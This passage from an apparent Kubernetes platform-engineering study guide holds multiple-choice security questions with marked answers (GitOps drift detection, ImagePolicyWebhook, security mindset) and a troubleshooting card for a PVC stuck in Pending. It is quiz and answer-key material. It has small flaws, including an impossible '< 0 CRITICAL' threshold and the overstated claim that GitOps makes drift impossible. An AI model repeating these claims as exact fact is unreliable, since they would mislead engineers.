  │  • Security incident response game day                                  │
  │  • Review and update security policies                                  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: create a "Security Posture Dashboard" in Grafana showing CIS compliance score, active CVEs by severity, policy violation trends, and certificate expiry dates. Review in the weekly platform team meeting. Platform security is not a project — it's a practice. Practice daily, or fail spectacularly.

Why not A? New CVEs are discovered daily, configurations drift, and permissions accumulate — security requires continuous attention. Why not C? Platform engineers build and operate the platform — security is everyone's responsibility (DevSecOps). Why not D? ALL platforms are targets — security posture matters regardless of industry.

Security & Policy Q198 of 200
What is drift detection in platform security and how does GitOps prevent configuration drift?
A) Drift detection is a Kubernetes feature that automatically reboots pods when their configuration changes
B) Drift detection only applies to application code — infrastructure configuration doesn't experience drift
C) Configuration drift occurs when the ACTUAL state of the cluster diverges from the DESIRED state in Git. Example: someone runs `kubectl edit networkpolicy` to temporarily allow traffic, forgets to revert — now the cluster is less secure than Git defines. GitOps (Argo CD) continuously reconciles: every 3 minutes, Argo CD compares the live cluster state to the Git manifest. If drift is detected, Argo CD can auto-revert (self-heal) or alert. This prevents "snowflake" configurations and ensures what's in Git IS what's running
D) Drift detection is handled by Kubernetes' built-in reconciliation loop — GitOps tools are unnecessary
✅ Correct Answer: C

Configuration drift is the silent security killer. An on-call engineer at 3 AM runs `kubectl delete networkpolicy default-deny` to unblock traffic, promises to revert, forgets. Now the cluster runs without network isolation for 6 months. GitOps prevents this: Argo CD's self-heal option auto-reverts any manual changes within 3 minutes. Even without self-heal, Argo CD shows the application as "OutOfSync" — a visible indicator that someone changed something manually. Security policies should be managed EXCLUSIVELY through Git — `kubectl edit` should be treated as a last resort emergency measure, with every manual change automatically reverted by GitOps.

GitOps Drift Detection
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  DESIRED STATE (Git)                  ACTUAL STATE (Cluster)             │
  │  ┌──────────────────────┐            ┌──────────────────────────────┐   │
  │  │ NetworkPolicy:       │            │ NetworkPolicy:               │   │
  │  │   default-deny       │    DRIFT   │   default-deny ← MANUALLY     │   │
  │  │   ingress: []        │◀══════════▶│   DELETED by someone!        │   │
  │  │                      │            │                               │   │
  │  │ Kyverno policy:      │            │ Kyverno policy:               │   │
  │  │   block-latest: true │            │   block-latest: false ← EDIT │   │
  │  └──────────────────────┘            └──────────────────────────────┘   │
  │                                                                         │
  │  ARGO CD RESPONSE (every 3 minutes):                                    │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  selfHeal: true → Auto-revert manual changes → Git state restored│  │
  │  │  selfHeal: false → Mark OutOfSync → Alert Slack → Human reviews  │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: manage ALL security policies (NetworkPolicies, Kyverno ClusterPolicies, RBAC) through Git + Argo CD. Enable self-heal on security-critical resources. Treat `kubectl edit` as a security incident — it should trigger an alert and auto-revert. If it's not in Git, it doesn't exist. GitOps makes configuration drift impossible.

Why not A? Drift detection compares desired vs actual state, not pod restart behavior. Why not B? Infrastructure configuration drifts constantly through manual edits — GitOps prevents this. Why not D? K8s reconciles individual resources (e.g., a Deployment's replicas), not holistic configuration — GitOps provides cross-resource reconciliation.

Security & Policy Q199 of 200
What is the ImagePolicyWebhook admission controller and how does it enforce image security?
A) ImagePolicyWebhook is a Kubernetes admission controller that calls an external webhook to validate every image BEFORE a pod starts. The webhook receives the image reference and decides: ALLOW or DENY. It can enforce policies like: "Only images from registry.anihpj.com are allowed," "Images must have at least 1 signature from Cosign," "Images must pass vulnerability scan with < 3 HIGH CVEs." Unlike Kyverno/OPA which evaluate Kubernetes resources in general, ImagePolicyWebhook specializes in image-specific enforcement and can be backed by any image validation service (Trivy, Grype, custom logic)
B) ImagePolicyWebhook is an alternative to container runtimes — it replaces containerd and CRI-O
C) ImagePolicyWebhook is a deprecated feature removed in Kubernetes 1.25 — it no longer functions
D) ImagePolicyWebhook only checks image tags — it doesn't validate image signatures or vulnerabilities
✅ Correct Answer: A

ImagePolicyWebhook is a specialized defense: while Kyverno can validate pod specs broadly, ImagePolicyWebhook focuses exclusively on image validation. It's configured via the API server's `--admission-control-config-file` pointing to an `ImagePolicyWebhook` config that specifies the webhook backend URL. The webhook receives an `ImageReview` containing the image reference, namespace, and pod metadata — it returns `Allowed: true/false` with a reason. Common use: connect to a container signing verification service that checks Cosign signatures and vulnerability scan results. If the image has CRITICAL CVEs → deny. If unsigned → deny.

ImagePolicyWebhook — Image Validation Gate
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  Pod creation request: image = anihpj-api:v2.1.0                        │
  │       │                                                                 │
  │       ▼                                                                 │
  │  ImagePolicyWebhook → POST /check-image to webhook backend             │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  Webhook validates:                                               │  │
  │  │  ☐ Registry: registry.anihpj.com? ✅                              │  │
  │  │  ☐ Cosign signature: valid? ✅                                     │  │
  │  │  ☐ Vulnerability scan: < 0 CRITICAL, < 3 HIGH? ✅                │  │
  │  │  ☐ SLSA provenance: level >= 2? ✅                                 │  │
  │  │                                                                   │  │
  │  │  ALL PASS → ALLOW                                                 │  │
  │  │  ANY FAIL → DENY with reason                                      │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: deploy an ImagePolicyWebhook backend that validates Cosign signatures and Trivy scan results. Every pod creation must pass image validation. ImagePolicyWebhook: the last line of defense ensuring only trusted, scanned images run in your cluster.

Why not B? It's an admission plugin, not a container runtime — images are still pulled and run by containerd/CRI-O. Why not C? ImagePolicyWebhook is current and functional — it was not deprecated or removed. Why not D? The webhook receives the full image reference and can perform ANY validation — signatures, vulnerabilities, registries, tags.

Security & Policy Q200 of 200
What is the platform engineer's security mindset — the guiding principle for building secure cloud native platforms?
A) Security is the security team's job — platform engineers should focus on delivering features fast and let security review later
B) Security is a checkbox you complete before going to production — once checked, you can focus on features for the rest of the year
C) The most secure platform is one where developers have no access — lock everything down and require security team approval for every change
D) "Make the secure thing the easy thing." Security must be invisible to developers — baked into the platform, not bolted on. Developers shouldn't need to know about mTLS (service mesh handles it), certificate rotation (cert-manager handles it), image signing (CI pipeline handles it), or policy compliance (Kyverno handles it). The platform provides security as a SERVICE: deploy your app, get encryption, authentication, vulnerability scanning, and compliance automatically. When security blocks developers, they work around it. When security enables developers, they embrace it. "Secure by default, easy to use, impossible to bypass"
✅ Correct Answer: D

The platform security mindset: security is a feature, not a gate. Developers deploy to production 10 times a day. If each deploy requires a security review, they'll either slow to a crawl or bypass the process. Instead: CI pipeline scans for vulnerabilities and signs images automatically. Kyverno enforces policies at admission — no manual review. Service mesh provides mTLS — the app doesn't know it exists. cert-manager rotates TLS certificates — no one wakes up at 2 AM for an expired cert. Falco monitors runtime — attacks are detected, not prevented by blocking developer productivity. The platform's security promise: "Focus on your code. We've got security covered."

Platform Security Mindset
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  ❌ TRADITIONAL MINDSET (Security as Gatekeeper):                       │
  │  "Submit a security review ticket. We'll evaluate in 2-3 business      │
  │   days. If approved, you can deploy. No exceptions."                    │
  │  Result: Developers bypass security, deploy shadow IT, ship insecure    │
  │                                                                         │
  │  ✅ PLATFORM MINDSET (Security as Enabler):                             │
  │  "Push your code. The CI pipeline scans, signs, and validates          │
  │   automatically. Kyverno enforces policies. mTLS protects traffic.     │
  │   Deploy anytime — the platform handles security for you."              │
  │  Result: Developers ship fast AND securely because security is          │
  │          invisible, automated, and built into the platform              │
  │                                                                         │
  │  CORE PRINCIPLES:                                                       │
  │  • Secure by default — protection without configuration                │
  │  • Developer-friendly — security doesn't slow you down                  │
  │  • Defense in depth — multiple layers, no single point of failure      │
  │  • Continuous — not a checkbox, not an audit, every day                │
  │  • Automated — if a human must do it, it will eventually be skipped    │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: every time a developer asks "Can I deploy?" the answer is "Yes — the platform has already scanned, signed, and validated everything. Go ahead." That's the platform security promise. Build a platform where security is the default, not the exception. Developers don't need to be security experts — because you already are, and you baked your expertise into the platform.

Why not A? "Throw it over the wall to security" is the anti-pattern that created DevOps — security is everyone's responsibility. Why not B? Security is continuous — new CVEs, new attacks, new compliance requirements emerge daily. Why not C? Locking everything down kills developer velocity — the platform must balance security with usability.

🔧 Part 2: 100 Platform Engineering Issues

Real-world cloud native platform failure scenarios — each with symptom, 15 categorized causes (5 most likely + 5 less likely + 5 new cluster), diagnostic commands, solutions, and personal advice. Patterned after the 5+5+5 cause-card format.

100Issues
5Categories
15Causes per Issue

🏗️ Category 1: Platform Architecture Issues (15 Issues)PA1-PA15

🟢 Platform Architecture Issues — Infrastructure, Networking, Storage, Multi-Tenancy

Platform architecture is the foundation. When the underlying infrastructure breaks, everything on top fails. These issues cover node failures, PVC binding, DNS, cost spikes, noisy neighbors, and cluster-wide outages.

📌 PA1–PA3: Infrastructure & Node Failures

PA1
🏗️ CATEGORY 1: PLATFORM ARCHITECTURE — Issue PA1
PVC Stuck in Pending State — No PV Bound

🔍 Symptom: kubectl get pvc shows STATUS: Pending indefinitely. kubectl describe pvc shows "no persistent volumes available for this claim." The anihpj-db PostgreSQL pod can't start because its PVC won't bind.

  kubectl get pvc
  NAME         STATUS    VOLUME   CAPACITY   STORAGECLASS   AGE
  anihpj-pvc   Pending                      fast-ssd       5m

  kubectl describe pvc anihpj-pvc
  Events:
    Warning  VolumeBinding  no persistent volumes available for this claim
    Warning  VolumeBinding  storageclass.storage.k8s.io "fast-ssd" not found
🔴5 Most Likely Causes
  1. StorageClass does not exist: The PVC references a StorageClass that hasn't been created. kubectl get sc — if "fast-ssd" is missing, create it or fix the PVC's storageClassName.
  2. No matching PV available: In static provisioning, no PV matches the PVC's storage size, access mode, or selector. kubectl get pv — check capacity and accessModes.
  3. StorageClass provisioner not installed: The CSI driver (e.g., ebs.csi.aws.com) is not deployed. kubectl get pods -n kube-system | grep csi — provisioner pods must be Running.
  4. Access mode mismatch: PVC requests ReadWriteMany but only ReadWriteOnce PVs exist. Check kubectl get pv -o yaml | grep -A2 accessModes.
  5. StorageClass has volumeBindingMode: WaitForFirstConsumer and no pod uses the PVC yet. The PV is only created when a pod actually references the PVC.
🟡5 Less Likely Causes
  1. CSI driver pod CrashLoopBackOff — provisioner can't create volumes
  2. Cloud provider API rate limiting — too many PVCs created simultaneously
  3. PVC selector labels don't match any PV labels
  4. Node where CSI driver runs has taint without toleration
  5. storageClassName: "" (empty string, not null!) — requests a PV with NO StorageClass, but all PVs have one
🟣5 New Cluster Causes
  1. No default StorageClass set: kubectl get sc — look for "(default)". Without it, PVCs without storageClassName won't bind. Set: kubectl patch sc <name> -p '{"metadata":{"annotations":{"storageclass.kubernetes.io/is-default-class":"true"}}}'
  2. CSI driver not yet installed — common in fresh kubeadm clusters
  3. Cloud credentials not configured for CSI driver to provision volumes
  4. RBAC for CSI driver service account missing
  5. kubelet missing --cloud-provider flag for legacy in-tree provisioners
🔍 What to Look At:
kubectl get sc,pv,pvc --all-namespaces The full storage stack in one view — see StorageClass, PV, and PVC together.
kubectl describe pvc <name> The Events section tells you exactly why binding failed — always read the events first.
🎯 #1 Root Cause: StorageClass does not exist or is misnamed. The PVC references a StorageClass that hasn't been created — the most common platform infrastructure pitfall.
🔧 How to Solve:
1. Verify StorageClass exists kubectl get sc If the StorageClass referenced by the PVC is missing, create it or fix the PVC's storageClassName.
2. Check provisioner and parameters kubectl describe sc <name> Verify the provisioner is correct and the CSI driver is installed and running.
3. Static provisioning kubectl get pv Create a PV matching the PVC's requested size, accessMode, and selector labels.
4. Dynamic provisioning Install the CSI driver: kubectl apply -f <csi-driver-url>. Verify CSI pods are Running in kube-system.
5. Set default StorageClass kubectl patch sc <name> -p '{"metadata":{"annotations":{"storageclass.kubernetes.io/is-default-class":"true"}}}' PVCs without an explicit storageClassName will use the default.
💡 Personal Advice:
Always verify StorageClass FIRST. The #1 PVC issue in platform engineering is a missing or misnamed StorageClass. Run kubectl get sc before writing any PVC YAML.
Empty string is NOT null. storageClassName: "" Requests a PV with NO StorageClass — different from omitting the field entirely. Know this distinction.
CSI driver must be Running. Even with correct StorageClass, if the CSI provisioner pod is CrashLoopBackOff, no volumes will be created.
WaitForFirstConsumer delays binding. If volumeBindingMode is WaitForFirstConsumer, the PV is only created when a pod actually uses the PVC. Don't mistake this for a failure.
